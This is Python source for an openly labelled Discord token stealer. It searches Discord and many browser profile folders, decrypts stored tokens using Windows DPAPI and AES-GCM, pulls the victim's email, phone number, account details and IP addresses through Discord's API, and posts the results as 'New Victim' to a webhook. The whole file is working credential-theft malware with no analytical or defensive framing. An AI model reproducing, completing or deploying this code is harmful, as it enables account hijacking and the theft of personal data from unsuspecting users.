import win32crypt
import base64
import json
from Crypto.Cipher import AES
import os
import sys
import re
import requests
from datetime import datetime, timezone
import socket

webhookUrl = None

def GetToken():
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
            except Exception as e:
                pass
    return token

token = GetToken()
victimData = {}

def GetInfo():
    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }

    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)

        if res.status_code == 200:
            ResData = res.json()

            username = ResData["username"]
            userID = ResData['id']
            PhoneNumber = ResData['phone']
            email = ResData['email']
            locale = ResData['locale']
            nsfwAllowed = ResData['nsfw_allowed']

            if nsfwAllowed is True:
                nsfwAllowed = "Allowed"
            else:
                nsfwAllowed = "Not allowed"
            
            language = languages.get(locale)

            timestamp = ((int(userID) >> 22) + 1420070400000) / 1000
            CreationDate = datetime.fromtimestamp(timestamp, timezone.utc).strftime('%d-%m-%Y %H:%M:%S UTC')

            HasNitro = False
            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
            if res.status_code == 200:
                nitroData = res.json()
                HasNitro = bool(len(nitroData) > 0)
                if HasNitro:
                    d1 = datetime.strptime(nitroData[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitroData[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    DaysLeft = abs((d2 - d1).days)

                if not HasNitro:
                    NitroStatus = "False"
                elif HasNitro:
                    NitroStatus = "True"
                    ExpirationDate = f"{DaysLeft} day(s)"
    except Exception:
        sys.exit()
    
    try:
        victimData["username"] = username
        victimData["userID"] = userID
        victimData["CreationDate"] = CreationDate
        victimData["email"] = email if email else None
        victimData["PhoneNumber"] = PhoneNumber if PhoneNumber else None
        victimData["NitroStatus"] = NitroStatus
        victimData["ExpirationDate"] = ExpirationDate if HasNitro else None
        victimData["nsfwAllowed"] = nsfwAllowed
    except Exception:
        victimData["username"] = None
        victimData["userID"] = None
        victimData["CreationDate"] = None
        victimData["email"] = None
        victimData["PhoneNumber"] = None
        victimData["NitroStatus"] = None
        victimData["ExpirationDate"] = None
        victimData["nsfwAllowed"] = None

def GetIP():
    PublicIP = requests.get("https://api.ipify.org").text

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        PrivateIP = s.getsockname()[0]
    finally:
        s.close()

    try:
        victimData["PublicIP"] = PublicIP
        victimData["PrivateIP"] = PrivateIP
    except Exception:
        victimData["PublicIP"] = None
        victimData["PrivateIP"] = None

GetInfo()
GetIP()

if token is None:
    sys.exit()

message = {
    "content": f"""
# New Victim : {victimData["PublicIP"]}
```
Token         : {token}
``````
Username      : {victimData["username"]}
User ID       : {victimData["userID"]}\n
Creation date : {victimData["CreationDate"]}\n
Email         : {victimData["email"]}
Phone number  : {victimData["PhoneNumber"]}\n
Has Nitro     : {victimData["NitroStatus"]}
Expires at    : {victimData["ExpirationDate"]}\n
NSFW          : {victimData["nsfwAllowed"]}
``````
Public IP     : {victimData["PublicIP"]}
Private IP    : {victimData["PrivateIP"]}
```
"""
}

response = requests.post(webhookUrl, json=message)